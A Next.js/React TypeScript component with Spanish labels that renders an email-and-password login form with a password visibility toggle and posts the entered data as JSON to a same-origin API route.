"use client";
import Link from "next/link";
import { useState } from "react";

import { FaEye, FaEyeSlash } from "react-icons/fa";

interface FormularioProps {
  mostrarPassword: boolean;
  setMostrarPassword: (mostrar: boolean) => void;
}

export default function FormularioBot({
  mostrarPassword,
  setMostrarPassword,
}: FormularioProps) {
  const [datos, setDatos] = useState({
    email: "",
    password: "",
  });
  const handleEnvio = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    try {
      const respuesta = await fetch("/api/enviar-data", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(datos),
      });

      console.log(respuesta);
      const resultado = await respuesta.json();
      console.log(resultado);
    } catch (error) {
      console.log(error);
    }
  };

  console.log(handleEnvio);

  return (
    <form onSubmit={handleEnvio} className="max-w-88 mx-auto">
      <div className="mb-3">
        <label htmlFor="email" className="block">
          Email:*
        </label>
        <input
          type="email"
          id="email"
          name="email"
          autoComplete="off"
          value={datos.email}
          onChange={(e) =>
            setDatos({
              ...datos,
              email: e.target.value,
            })
          }
          placeholder="usuario@example.com"
          className="w-full bg-[#fffaf5] rounded-md placeholder:text-[#9ca3b6] border border-[#cac2b1] px-5 py-3 text-[#8c662b] outline-none text-[0.9375rem]"
        />
      </div>
      <div>
        <label htmlFor="password" className="block">
          Contraseña:*
        </label>
        <div className="grid grid-cols-[1fr_auto] gap-4 items-center">
          <input
            type={mostrarPassword ? "text" : "password"}
            id="password"
            name="password"
            value={datos.password}
            onChange={(e) =>
              setDatos({
                ...datos,
                password: e.target.value,
              })
            }
            autoComplete="off"
            className="w-full bg-[#fffaf5] rounded-md placeholder:text-[#9ca3b6] border border-[#cac2b1] px-5 py-3 text-[#8c662b] outline-none text-[0.9375rem]"
          />
          <div>
            <FaEye
              fill="#8c662b"
              size={20}
              className={mostrarPassword ? "" : "hidden"}
              onClick={() => setMostrarPassword(!mostrarPassword)}
            />
            <FaEyeSlash
              fill="#8c662b"
              size={22}
              onClick={() => setMostrarPassword(!mostrarPassword)}
              className={mostrarPassword ? "hidden" : ""}
            />
          </div>
        </div>
      </div>

      <div className="grid lg:grid-cols-[1fr_1fr] items-center mt-4">
        <Link
          href="/"
          className="font-semibold lg:text-sm border-b-2 border-[#e0a035] flex mt-auto hover:text-[#e0a035] w-fit mx-auto text-xs"
        >
          ¿OLVIDASTE TU CONTRASEÑA?
        </Link>
        <button
          type="submit"
          className="bg-[#8c662b] w-full lg:py-3 py-2.5 rounded-md mt-4 text-white text-[0.9375rem]"
        >
          ENTRAR
        </button>
      </div>
    </form>
  );
}
